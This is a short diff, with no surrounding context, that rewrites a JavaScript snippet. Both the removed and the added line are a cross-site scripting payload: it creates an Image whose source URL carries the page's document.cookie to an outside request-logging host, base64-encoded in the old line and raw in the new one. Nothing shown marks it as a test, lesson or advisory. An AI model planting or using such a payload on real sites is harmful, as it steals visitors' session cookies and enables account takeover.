@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'http://requestbin.whapi.cloud/1oxgm631?
-data='+btoa(document.cookie);
+var i=new Image;i.src="http://requestbin.whapi.cloud/1oxgm631/?cookie="+document.cookie;
